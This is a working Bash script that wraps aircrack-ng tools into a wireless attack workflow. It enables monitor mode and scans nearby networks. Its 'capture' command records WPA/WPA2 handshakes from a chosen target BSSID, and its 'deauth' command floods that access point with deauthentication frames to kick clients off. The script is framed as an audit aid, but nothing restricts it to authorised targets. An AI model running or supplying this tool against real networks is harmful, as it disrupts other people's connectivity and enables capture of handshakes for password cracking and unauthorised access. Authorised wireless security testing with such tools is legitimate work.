set -o errexit
set -o pipefail
set -o nounset

VERSION="1.0.0"

DEFAULT_MONITOR_IFACE="wlan0"
DEFAULT_MANAGED_IFACE="wlan1"

# -----------------------------------------------------------------------------
# Utility Functions
# -----------------------------------------------------------------------------

banner() {
cat <<EOF

===========================================================
 Native Multi-Adapter Wireless Workflow
 Reference Implementation
 Version ${VERSION}
===========================================================

EOF
}

help() {

cat <<EOF

Usage:

    wireless <command>

Available Commands

    status      Show wireless interface status
    monitor     Switch wlan0 to Monitor Mode
    station     Restore wlan0 to Managed Mode
    restore     Restart networking services
    scan        Scan nearby wireless networks
    capture     Capture WPA/WPA2 handshake
    deauth      Send deauthentication frames
    version     Display application version
    help        Display this help

Examples

    wireless status
    wireless monitor
    wireless scan
    wireless capture
    wireless restore

EOF

}

version() {

echo "Native Multi-Adapter Wireless Workflow"
echo "Reference Implementation"
echo "Version ${VERSION}"

}

require_root() {

if [[ $EUID -ne 0 ]]; then
    echo "This command requires administrative privileges."
    echo "Please run it using sudo."
    exit 1
fi

}

check_dependencies() {

local deps=(
    iw
    ip
    airodump-ng
    aireplay-ng
    ethtool
)

for cmd in "${deps[@]}"; do
    if ! command -v "$cmd" >/dev/null 2>&1; then
        echo "Missing dependency: $cmd"
        exit 1
    fi
done

}

# -----------------------------------------------------------------------------
# Commands
# -----------------------------------------------------------------------------

status() {

echo
echo "Current Wireless Adapter Status"
echo "-------------------------------"

for iface in "$DEFAULT_MONITOR_IFACE" "$DEFAULT_MANAGED_IFACE"; do

    if [[ -d "/sys/class/net/${iface}" ]]; then

        MODE=$(iw dev "$iface" info 2>/dev/null | awk '/type/ {print $2}')

        [[ -z "$MODE" ]] && MODE="managed"

        DRIVER=$(ethtool -i "$iface" 2>/dev/null | awk '/driver/ {print $2}')

        echo "Interface : ${iface}"
        echo "Mode      : ${MODE}"
        echo "Driver    : ${DRIVER}"
        echo

    fi

done

}

monitor() {

require_root

echo "Switching ${DEFAULT_MONITOR_IFACE} to Monitor Mode..."

ip link set "${DEFAULT_MONITOR_IFACE}" down
iw "${DEFAULT_MONITOR_IFACE}" set type monitor
ip link set "${DEFAULT_MONITOR_IFACE}" up

echo
echo "Monitor Mode enabled."
echo "${DEFAULT_MANAGED_IFACE} continues providing Internet connectivity."

}

station() {

require_root

echo "Restoring ${DEFAULT_MONITOR_IFACE} to Managed Mode..."

ip link set "${DEFAULT_MONITOR_IFACE}" down
iw "${DEFAULT_MONITOR_IFACE}" set type managed
ip link set "${DEFAULT_MONITOR_IFACE}" up

echo
echo "Managed Mode restored."

}

restore() {

require_root

echo "Restarting networking services..."

systemctl restart NetworkManager
systemctl restart wpa_supplicant

dhclient -v "${DEFAULT_MANAGED_IFACE}"

echo
echo "Testing Internet connectivity..."
ping -c 2 8.8.8.8

}

scan() {

require_root

echo
echo "Starting 15-second wireless scan..."

airodump-ng "${DEFAULT_MONITOR_IFACE}" --duration 15

}

capture() {

require_root

echo

read -rp "Target ESSID : " TARGET_NAME
read -rp "Channel      : " TARGET_CHAN
read -rp "BSSID        : " TARGET_MAC

SESSION_DIR="$HOME/Documents/WiFi_Audits/Session_$(date +%Y-%m-%d_%H-%M-%S)"

mkdir -p "$SESSION_DIR"

echo
echo "Session directory:"
echo "$SESSION_DIR"
echo

echo "Switching interface to channel ${TARGET_CHAN}..."

iwconfig "${DEFAULT_MONITOR_IFACE}" channel "${TARGET_CHAN}"

echo
echo "Starting capture..."
echo
echo "Open another terminal and execute:"
echo
echo "    wireless deauth"
echo

airodump-ng \
    -c "${TARGET_CHAN}" \
    --bssid "${TARGET_MAC}" \
    -w "${SESSION_DIR}/handshake_${TARGET_NAME}" \
    "${DEFAULT_MONITOR_IFACE}"

}

deauth() {

require_root

echo

read -rp "Target BSSID : " TARGET_BSSID

echo
echo "Sending deauthentication frames..."

aireplay-ng \
    -0 10 \
    -a "${TARGET_BSSID}" \
    "${DEFAULT_MONITOR_IFACE}"

}

# -----------------------------------------------------------------------------
# Main
# -----------------------------------------------------------------------------

check_dependencies

case "${1:-help}" in

status)
    status
    ;;

monitor)
    monitor
    ;;

station)
    station
    ;;

restore)
    restore
    ;;

scan)
    scan
    ;;

capture)
    capture
    ;;

deauth)
    deauth
    ;;

version)
    version
    ;;

help|-h|--help)
    banner
    help
    ;;

*)
    echo "Unknown command: ${1}"
    echo
    help
    exit 1
    ;;

esac
